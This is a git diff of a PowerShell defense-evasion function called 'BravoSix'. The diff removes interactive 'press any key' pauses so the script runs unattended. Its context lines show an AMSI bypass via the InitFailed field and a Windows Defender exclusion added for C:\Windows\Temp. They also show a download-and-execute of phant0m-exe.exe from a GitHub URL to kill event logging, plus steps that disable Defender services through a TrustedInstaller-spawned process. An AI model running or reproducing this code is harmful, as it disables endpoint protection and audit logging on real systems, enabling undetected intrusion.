@@ -13,18 +13,11 @@ function BravoSix {
     Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}}
     $g=$f.SetValue($null,$true)
 
-    Write-Host  'Press any key to continue...';
-    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
-
     # Adding defender exclusions
     Write-Host "[+] Adding Defender exclusion folders" -ForegroundColor Green
     Write-Host
     $exclusionPath = "C:\Windows\Temp"
     Add-MpPreference -ExclusionPath $exclusionPath -AttackSurfaceReductionOnlyExclusions $exclusionPath
-
-    Write-Host  'Press any key to continue...';
-    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
-
 
     # Killing eventlog
     Write-Host "[+] Disabling EventLogs" -ForegroundColor Green
@@ -32,10 +25,6 @@ function BravoSix {
     $phant0mPath = $exclusionPath + "\phant0m-exe.exe"
     Invoke-WebRequest -Uri https://github.com/RFC1918-hub/RFCRandom/raw/main/phant0m-exe.exe -OutFile $phant0mPath
     & $phant0mPath
-
-    Write-Host  'Press any key to continue...';
-    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
-
     
     # Disabling defender services and drivers
     $spawnPPID = @"
@@ -202,7 +191,6 @@ function BravoSix {
     Write-Host "[i] TrustedInstaller pid: $serviceProcessId" -ForegroundColor Green
     
     $powershellPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-    
     
     # Disabling defender services
     Write-Host "[+] Disable services" -ForegroundColor Green
